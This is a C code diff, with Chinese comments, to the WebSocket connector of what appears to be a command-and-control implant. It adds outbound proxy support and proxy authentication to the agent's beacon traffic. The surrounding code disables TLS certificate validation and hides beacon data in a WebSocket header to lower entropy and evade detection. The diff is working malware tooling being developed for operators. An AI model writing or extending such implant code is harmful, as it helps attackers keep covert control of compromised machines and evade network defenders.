@@ -127,6 +127,58 @@ BOOL ConnectorWS_SetProfile(Connector* self, void* profilePtr, BYTE* beatData, U
     data->ans_size       = profile.ans_size;
     data->ans_pre_size   = profile.ans_pre_size;
 
+    // ★ 出站代理：ConnectorHTTP 会按 profile.proxy_* 构造 proxy_url 并在 WinHttpOpen
+    //   时用 WINHTTP_ACCESS_TYPE_NAMED_PROXY；WS 连接器此前**完全没有读这几个字段**，
+    //   永远以 DEFAULT_PROXY + NULL 打开会话。于是操作员在生成页勾了代理、服务端也把
+    //   proxy_type/host/port/user/pass 编进了 profile，agent 却直连（或走主机系统代理），
+    //   表现为「建立代理后代理实际未生效」。这里与 ConnectorHTTP 逐字对齐。
+    data->proxy_type     = profile.proxy_type;
+    data->proxy_username = (CHAR*)profile.proxy_username;
+    data->proxy_password = (CHAR*)profile.proxy_password;
+    data->proxy_url      = NULL;
+
+    if (data->proxy_type != PROXY_TYPE_NONE && profile.proxy_host != NULL) {
+        ULONG hostLen = StrLenA((CHAR*)profile.proxy_host);
+        WORD  port    = profile.proxy_port;
+        CHAR  portStr[6];
+        int   portIdx = 0;
+        if (port == 0) {
+            portStr[portIdx++] = '0';
+        }
+        else {
+            CHAR temp[6];
+            int tempIdx = 0;
+            while (port > 0) {
+                temp[tempIdx++] = '0' + (port % 10);
+                port /= 10;
+            }
+            for (int i = tempIdx - 1; i >= 0; i--) {
+                portStr[portIdx++] = temp[i];
+            }
+        }
+        portStr[portIdx] = 0;
+
+        ULONG prefixLen = (data->proxy_type == PROXY_TYPE_HTTPS) ? 8 : 0;
+        data->proxy_url = (CHAR*)data->functions->http.LocalAlloc(LPTR, prefixLen + hostLen + 1 + portIdx + 1);
+        if (data->proxy_url != NULL) {
+            ULONG idx = 0;
+            if (data->proxy_type == PROXY_TYPE_HTTPS) {
+                data->proxy_url[idx++] = 'h';
+                data->proxy_url[idx++] = 't';
+                data->proxy_url[idx++] = 't';
+                data->proxy_url[idx++] = 'p';
+                data->proxy_url[idx++] = 's';
+                data->proxy_url[idx++] = ':';
+                data->proxy_url[idx++] = '/';
+                data->proxy_url[idx++] = '/';
+            }
+            memcpy(data->proxy_url + idx, profile.proxy_host, hostLen);
+            idx += hostLen;
+            data->proxy_url[idx++] = ':';
+            memcpy(data->proxy_url + idx, portStr, portIdx + 1);
+        }
+    }
+
     // For WebSockets, we can embed the beatData in the standard Sec-WebSocket-Protocol header to lower entropy
     LPSTR encBeat = b64_encode(beatData, beatDataSize);
     ULONG enc_beat_length = StrLenA(encBeat);
@@ -178,7 +230,17 @@ void ConnectorWS_SendData(Connector* self, BYTE* data_buf, ULONG data_size)
             ConnectorWS_Disconnect(data);
 
             WCHAR* wUA = HttpMbToWc_WS(data->functions, data->user_agents[data->ua_index]);
-            data->hInternet = data->functions->http.WinHttpOpen(wUA, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, WINHTTP_NO_PROXY_BYPASS, 0);
+
+            // ★ 与 ConnectorHTTP 对齐：配置了出站代理就用 NAMED_PROXY，否则维持默认。
+            DWORD  accessType = WINHTTP_ACCESS_TYPE_DEFAULT_PROXY;
+            WCHAR* proxyW     = NULL;
+            if (data->proxy_url != NULL) {
+                accessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
+                proxyW = HttpMbToWc_WS(data->functions, data->proxy_url);
+            }
+
+            data->hInternet = data->functions->http.WinHttpOpen(wUA, accessType, proxyW, WINHTTP_NO_PROXY_BYPASS, 0);
+            if (proxyW) data->functions->http.LocalFree(proxyW);
             if (wUA) data->functions->http.LocalFree(wUA);
 
             if (data->hInternet) {
@@ -199,6 +261,24 @@ void ConnectorWS_SendData(Connector* self, BYTE* data_buf, ULONG data_size)
                     if (data->ssl) {
                         DWORD dwSec = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_REVOCATION | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
                         data->functions->http.WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwSec, sizeof(dwSec));
+                    }
+
+                    // ★ 代理认证：与 ConnectorHTTP 一致，代理要账号口令时下发。
+                    if (data->proxy_type != PROXY_TYPE_NONE && data->proxy_username != NULL) {
+                        WCHAR* wu = HttpMbToWc_WS(data->functions, data->proxy_username);
+                        if (wu) {
+                            DWORD ccb = (DWORD)((StrLenA(data->proxy_username) + 1) * sizeof(WCHAR));
+                            data->functions->http.WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY_USERNAME, wu, ccb);
+                            data->functions->http.LocalFree(wu);
+                        }
+                        if (data->proxy_password != NULL) {
+                            WCHAR* wp = HttpMbToWc_WS(data->functions, data->proxy_password);
+                            if (wp) {
+                                DWORD ccbp = (DWORD)((StrLenA(data->proxy_password) + 1) * sizeof(WCHAR));
+                                data->functions->http.WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY_PASSWORD, wp, ccbp);
+                                data->functions->http.LocalFree(wp);
+                            }
+                        }
                     }
 
                     // Request WebSocket upgrade
